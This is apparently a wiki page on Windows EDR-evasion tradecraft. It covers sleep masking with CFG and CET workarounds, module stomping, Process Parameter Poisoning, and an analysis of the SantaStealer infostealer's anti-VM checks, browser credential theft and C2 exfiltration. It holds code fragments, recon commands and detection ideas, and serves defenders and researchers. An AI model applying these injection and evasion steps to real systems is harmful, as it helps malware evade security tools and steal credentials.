Operational detail：对于长时间 waits 返回“success”（例如 `WAIT_OBJECT_0`），使 caller 在 image 被 masking 时继续执行。这种模式可以在 idle windows 期间将模块隐藏于 scanners，并避免经典的“patched `Sleep()`” signature。

Detection ideas (telemetry-based)
- 大量 `CreateTimerQueueTimer` callbacks 指向 `NtContinue`。
- `advapi32!SystemFunction032` 被用于大型、连续且接近 image 大小的 buffers。
- 大范围 `VirtualProtect`，随后执行 custom per-section permission restoration。

### Runtime CFG registration for sleep-obfuscation gadgets

在启用 CFG 的 targets 上，首次间接跳转到 `jmp [rbx]` 或 `jmp rdi` 这样的 mid-function gadget 通常会因为该 gadget 不存在于模块的 CFG metadata 中而使进程因 `STATUS_STACK_BUFFER_OVERRUN` 崩溃。要让 Ekko/Kraken-style chains 在 hardened processes 内保持运行：

- 使用 `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` 注册 chain 使用的每个 indirect destination，并提供 `CFG_CALL_TARGET_VALID` entries。
- 对于 loaded images（`ntdll`、`kernel32`、`advapi32`）内部的地址，`MEMORY_RANGE_ENTRY` 必须从 **image base** 开始，并覆盖 **完整 image size**。
- 对于 manually mapped/PIC/stomped regions，则使用 **allocation base** 和 allocation size。
- 不仅要标记 dispatch gadget，还要标记间接到达的 exports（`NtContinue`、`SystemFunction032`、`VirtualProtect`、`GetThreadContext`、`SetThreadContext`、wait/event syscalls），以及任何将成为 indirect targets 的 attacker-controlled executable sections。

这会将 ROP/JOP-style sleep chains 从“仅在 non-CFG processes 中有效”的方式，转变为可复用于 `explorer.exe`、browsers、`svchost.exe` 以及其他使用 `/guard:cf` 编译的 endpoints 的 primitive。

### CET-safe stack spoofing for sleeping threads

完整的 `CONTEXT` replacement 具有较高噪声，并且可能在 CET Shadow Stack systems 上失效，因为 spoofed `Rip` 仍必须与 hardware shadow stack 一致。更安全的 sleep-masking pattern 是：

- 选择同一 process 中的另一个 thread，并通过 `NtQueryInformationThread` 读取其 `NT_TIB` / TEB stack bounds（`StackBase`、`StackLimit`）。
- Backup 当前 thread 的真实 TEB/TIB。
- 使用 `GetThreadContext` 捕获真实的 sleeping context。
- **仅**将真实的 `Rip` 复制到 spoof context 中，同时保持 spoofed `Rsp`/stack state 不变。
- 在 sleep window 期间，将 spoof thread 的 `NT_TIB` 复制到当前 TEB，使 stack walkers 在 legitimate stack range 内进行 unwind。
- wait 完成后，恢复原始 TIB 和 thread context。

这会保留与 CET 一致的 instruction pointer，同时误导那些依赖 TEB stack metadata 验证 unwinds 的 EDR stack walkers。

### APC-based alternative: Kraken Mask

如果 timer-queue dispatch 的 signature 过于明显，则可以使用 queued APCs，从 suspended helper thread 执行相同的 sleep-encrypt-spoof-restore sequence：

- 创建一个以 `NtTestAlert` 为 entrypoint 的 helper thread。
- 使用 `NtQueueApcThread` 排队 prepared `CONTEXT` frames/APCs，并通过 `NtAlertResumeThread` drain 它们。
- 将 chain state 存储在 heap 而不是 helper stack 中，以避免耗尽默认的 64 KB thread stack。
- 使用 `NtSignalAndWaitForSingleObject` 原子地 signal start event 并 block。
- 在恢复 TIB/context 前 suspend main thread（`NtSuspendThread` → restore → `NtResumeThread`），以缩小 scanner 可能捕获 half-restored stack 的 race window。

这会将 `CreateTimerQueueTimer` + `NtContinue` signature 替换为 helper-thread/APC signature，同时保留相同的 RC4 masking 和 stack-spoofing 目标。

Additional detection ideas
- 在 sleeps、waits 或 APC dispatch 之前不久调用 `NtSetInformationVirtualMemory`，并使用 `VmCfgCallTargetInformation`。
- 在 `WaitForSingleObject(Ex)`、`NtWaitForSingleObject`、`NtSignalAndWaitForSingleObject` 或 `ConnectNamedPipe` 周围使用 `GetThreadContext`/`SetThreadContext`。
- `NtQueryInformationThread` 后紧接着直接写入当前 thread 的 TEB/TIB stack bounds。
- `NtQueueApcThread`/`NtAlertResumeThread` chains 间接到达 `SystemFunction032`、`VirtualProtect` 或 section-permission restoration helpers。
- 在 signed modules 内作为 dispatch pivots 反复使用短 gadget signatures，例如 `FF 23`（`jmp [rbx]`）或 `FF E7`（`jmp rdi`）。


## Precision Module Stomping

Module stomping 从目标 process 中已映射的 DLL 的 **`.text` section** 执行 payload，而不是分配明显的 private executable memory，或加载新的 sacrificial DLL。overwrite target 应为一个 **已加载、由 disk-backed 的 image**，其 code space 能够容纳 payload，同时不会破坏 process 仍需要的 code paths。

### Reliable target selection

针对 `uxtheme.dll` 或 `comctl32.dll` 等常见 modules 进行 naive stomping 很脆弱：DLL 可能没有加载到 remote process 中，而过小的 code region 会导致 process 崩溃。更可靠的 workflow 是：

1. 枚举 target process modules，并保留一个仅包含 names 的 include list，其中列出已加载的 DLLs。
2. 先构建 payload，并记录其 **exact byte size**。
3. 扫描磁盘上的 candidate DLLs，并将 PE section **`.text` 的 `Misc_VirtualSize`** 与 payload size 进行比较。相比 file size，这一点更重要，因为它反映 executable section **映射到 memory 时的大小**。
4. 解析 **Export Address Table (EAT)**，并选择一个 exported function RVA 作为 stomp start offset。
5. 计算 **blast radius**：如果 payload 超过所选 function boundary，就会覆盖内存中位于其后的 adjacent exports。

Typical recon/selection helpers seen in the wild:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Operational notes
- 优先使用远程进程中**已经加载**的 DLL，以避免 `LoadLibrary`/unexpected image loads 产生的 telemetry。
- 优先选择目标应用很少执行的 exports，否则正常代码路径可能在线程创建前后命中被 stomp 的字节。
- 较大的 implants 通常需要将 shellcode embedding 从字符串字面量改为 **byte-array/braced initializer**，以确保完整 buffer 在 injector source 中得到正确表示。

Detection ideas
- 向 **image-backed executable pages**（`MEM_IMAGE`、`PAGE_EXECUTE*`）执行 remote writes，而不是写入更常见的 private RWX/RX allocations。
- 内存中的 export entry points 与磁盘上的 backing file 不再匹配。
- Remote threads 或 context pivots 从合法 DLL export 内部开始执行，且其前几个字节最近被修改。
- 针对 DLL `.text` pages 执行可疑的 `VirtualProtect(Ex)` / `WriteProcessMemory` 序列，随后创建线程。

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) 是一种 **process-injection / EDR-evasion** 技术，可避免经典的 remote write 路径（`VirtualAllocEx` + `WriteProcessMemory`）。它不是将字节复制到已经运行的 target 中，而是利用 Windows 会将选定的 `CreateProcessW` startup parameters **复制到 child process 中**这一事实，并将它们存储在 `PEB->ProcessParameters`（`RTL_USER_PROCESS_PARAMETERS`）内部。

### Poisonable carriers copied by `CreateProcessW`

可用的 carriers 包括：

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment`（使用 `CREATE_UNICODE_ENVIRONMENT`）→ `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Practical carrier constraints:

- `lpCommandLine` 必须指向 `CreateProcessW` 可写的 memory，并且上限为 **32,767 个 Unicode characters**（包括 null terminator）。
- `lpEnvironment` 必须是由连续 `NAME=VALUE\0` strings 组成，并以额外的 `\0` 终止的 Unicode environment block。
- `lpReserved` 在官方定义中是 reserved，因此应将 `ShellInfo` mapping 视为 implementation detail，而不是稳定的 documented contract。

这使正常的 process creation 成为 **payload-transfer primitive**。operator 使用 attacker-controlled startup data 创建 child process，并让 Windows 执行 cross-process copy。

### Remote lookup flow without remote write APIs

创建 child 后，使用 **read-only** primitives 解析被复制的 buffer：

1. `NtQueryInformationProcess(ProcessBasicInformation)` → 获取 `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. 读取 remote `PEB`
3. 跟随 `PEB.ProcessParameters`
4. 读取 `RTL_USER_PROCESS_PARAMETERS`
5. 使用所选 pointer：
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Minimal flow:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### 执行复制的参数缓冲区

复制的参数区域通常是 `RW`，不可执行。常见的 P3 chain 是：

1. 正常创建进程（不使用 suspended）
2. 使用 `NtProtectVirtualMemory` / `VirtualProtectEx` 将选定的参数页面设为可执行
3. 复用 `PROCESS_INFORMATION` 中已返回的 main thread handle
4. 使用 `NtSetContextThread`（`CONTEXT_CONTROL`，覆盖 `RIP`）重定向 execution

不同于经典的 thread hijacking 工作流，这不需要 `SuspendThread` / `ResumeThread`；可以直接通过返回的 main thread handle 修改 context。

这可以避开一些通常会被监控的 injection API：

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- 通常还包括 `SuspendThread` / `ResumeThread`

### Null-byte 限制与 staged shellcode

这三个 carriers 都是**字符串或类似字符串的数据**，因此包含 `0x00` 的 raw payload 会在传输过程中被截断。一种实用的 workaround 是使用 **null-free first stage**，在 runtime 重建 constants，然后加载任意 second stage。

一种简单的 pattern 是基于 XOR 的 constant synthesis：
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
这使第一阶段能够构造栈字符串、API 参数、DLL 路径或第二阶段 shellcode loader，而无需在传输的参数中嵌入 null bytes。

### 基于栈的 API 调用（来自第一阶段）

当第一阶段必须调用 `LoadLibraryA` 等 API 时，可以：

- 将字符串/缓冲区 push 到目标栈上
- 预留 **32-byte x64 shadow space**
- 将 `RCX`、`RDX`、`R8`、`R9` 设置为常量或相对于 `RSP` 的指针
- 在调用前保持 `RSP` **16-byte 对齐**

随后，第二阶段可以从栈复制到 `PAGE_READWRITE` allocation 中，通过 `VirtualProtect` 将其切换为 `PAGE_EXECUTE_READ`，然后跳转执行，从而避免直接进行 RWX allocation。

### Detection ideas

作者提到的良好 hunting 机会：

- `VirtualProtectEx` / `NtProtectVirtualMemory` 将**进程参数页面设置为可执行**
- 该 protection change 后紧接着调用 `SetThreadContext` / `NtSetContextThread`
- 远程读取 `PEB`，随后读取 `RTL_USER_PROCESS_PARAMETERS`
- 创建进程期间，`lpCommandLine`、`lpEnvironment` 或 `STARTUPINFO.lpReserved` 的值异常长或具有高 entropy

### Notes

- P3 是一种**跨进程传输技巧**，本身并不是完整的 execution primitive：复制的参数仍需要 execute-permission change 和 execution redirection method。
- 作者曾考虑 `RtlCreateProcessReflection` / Dirty Vanity，但因其内部会触及 `NtWriteVirtualMemory` 和 `NtCreateThreadEx` 等可疑 primitives 而放弃。

## SantaStealer 用于 Fileless Evasion 和 Credential Theft 的 Tradecraft

SantaStealer（又名 BluelineStealer）展示了现代 info-stealer 如何在单一 workflow 中结合 AV bypass、anti-analysis 和 credential access。

### Keyboard layout gating & sandbox delay

- 配置标志（`anti_cis`）通过 `GetKeyboardLayoutList` 枚举已安装的键盘布局。如果发现 Cyrillic layout，该样本会写入一个空的 `CIS` marker，并在运行 stealers 前终止，从而确保其不会在被排除的 locales 上 detonate，同时留下一个 hunting artifact。
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### 分层的 `check_antivm` 逻辑

- Variant A 遍历进程列表，使用自定义滚动校验和对每个名称进行哈希，并将其与内置的 debugger/sandbox blocklist 进行比较；它还会对计算机名称重复执行该校验，并检查 `C:\analysis` 等工作目录。
- Variant B 检查系统属性（进程数量下限、最近启动时间），调用 `OpenServiceA("VBoxGuest")` 检测 VirtualBox additions，并围绕 sleep 执行计时检查，以识别 single-stepping。任何命中都会在 modules 启动前中止执行。

### 无文件 helper + 双重 ChaCha20 reflective loading

- 主 DLL/EXE 内嵌一个 Chromium credential helper，该 helper 要么被释放到磁盘，要么在内存中手动映射；无文件模式会自行解析 imports/relocations，因此不会写入 helper artifacts。
- 该 helper 使用 ChaCha20 对第二阶段 DLL 进行两次加密（两个 32 字节密钥 + 12 字节 nonce）。两轮处理完成后，它会对该 blob 执行 reflective loading（不使用 `LoadLibrary`），并调用源自 [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) 的导出函数 `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`。
- ChromElevator routines 使用 direct-syscall reflective process hollowing，将 payload 注入正在运行的 Chromium browser，继承 AppBound Encryption keys，并直接从 SQLite databases 中解密 passwords/cookies/credit cards，即使存在 ABE hardening 也能完成操作。


### 模块化内存 collection 与分块 HTTP exfil

- `create_memory_based_log` 遍历全局 `memory_generators` function-pointer table，并为每个启用的 module（Telegram、Discord、Steam、screenshots、documents、browser extensions 等）创建一个 thread。每个 thread 将结果写入 shared buffers，并在约 45 秒的 join window 后报告其 file count。
- 完成后，所有内容会使用静态链接的 `miniz` library 压缩为 `%TEMP%\\Log.zip`。随后 `ThreadPayload1` sleep 15 秒，并通过 HTTP POST 将 archive 以 10 MB chunks 流式发送到 `http://<C2>:6767/upload`，同时伪装 browser 的 `multipart/form-data` boundary（`----WebKitFormBoundary***`）。每个 chunk 会添加 `User-Agent: upload`、`auth: <build_id>`，以及可选的 `w: <campaign_tag>`；最后一个 chunk 会追加 `complete: true`，以便 C2 知道 reassembly 已完成。

## References

- [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)

{{#include ../banners/hacktricks-training.md}}
